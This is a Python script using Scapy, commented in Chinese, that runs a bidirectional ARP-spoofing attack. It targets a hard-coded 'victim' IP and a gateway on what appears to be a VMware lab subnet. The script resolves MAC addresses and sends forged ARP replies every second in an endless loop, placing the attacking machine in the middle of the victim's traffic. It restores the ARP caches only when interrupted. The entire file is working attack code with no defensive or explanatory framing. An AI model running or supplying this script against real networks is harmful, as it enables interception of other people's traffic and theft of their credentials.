from scapy.all import ARP, Ether, sendp, srp, conf, get_if_list
import time
victim_ip = "192.168.73.12"    # 受害机
gateway_ip = "192.168.73.79"   # 网关
# 自动检测可用接口（优先选择带有“VMnet”或“Ethernet”的接口）
iface = None
for i in get_if_list():
    if "VMnet" in i or "Ethernet" in i or "eth" in i:
        iface = i
        break
if not iface:
    iface = conf.iface  # 默认接口
def get_mac(ip):
    """发送ARP请求，获取目标MAC"""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        retry=2,
        iface=iface,
        verbose=False
    )
    for s, r in ans:
        return r[Ether].src
    return None
def spoof(target_ip, spoof_ip):
    """伪造ARP响应，欺骗 target_ip，让其认为 spoof_ip 对应本机MAC"""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] 未能解析 {target_ip} 的MAC地址，使用广播发送。")
        dst_mac = "ff:ff:ff:ff:ff:ff"
    else:
        dst_mac = target_mac
    packet = Ether(dst=dst_mac) / ARP(
        op=2,               # ARP reply
        pdst=target_ip,     # 欺骗目标 IP
        psrc=spoof_ip,      # 冒充的 IP
        hwdst=dst_mac       # 目标 MAC
    )
    sendp(packet, iface=iface, verbose=False)
def restore(dest_ip, src_ip):
    """恢复ARP缓存"""
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    if dest_mac and src_mac:
        packet = Ether(dst=dest_mac) / ARP(
            op=2,
            pdst=dest_ip,
            psrc=src_ip,
            hwsrc=src_mac,
            hwdst=dest_mac
        )
        sendp(packet, iface=iface, count=5, verbose=False)
try:
    attacker_ip = conf.route.route("0.0.0.0")[1]
    attacker_mac = get_mac(attacker_ip)
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    print("=== ARP 双向欺骗启动 ===")
    print(f"[+] 使用网卡接口: {iface}")
    print(f"[+] 攻击机 IP: {attacker_ip}")
    print(f"[+] 攻击机 MAC: {attacker_mac}")
    print(f"[+] 受害机 IP: {victim_ip}")
    print(f"[+] 受害机 MAC: {victim_mac}")
    print(f"[+] 网关 IP: {gateway_ip}")
    print(f"[+] 网关 MAC: {gateway_mac}")
    print("\n[*] 开始双向ARP欺骗（受害机 与 网关）...\n")
    count = 0
    while True:
        # 欺骗受害机，让它以为攻击机是网关
        spoof(victim_ip, gateway_ip)
        # 欺骗网关，让它以为攻击机是受害机
        spoof(gateway_ip, victim_ip)
        count += 1
        print(f"[{count}] 已发送双向ARP包：伪装 {gateway_ip}→{victim_ip} 与 {victim_ip}→{gateway_ip}")
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] 停止欺骗，正在恢复ARP表...")
    restore(victim_ip, gateway_ip)
    restore(gateway_ip, victim_ip)
    print("[*] 网络恢复完成。")
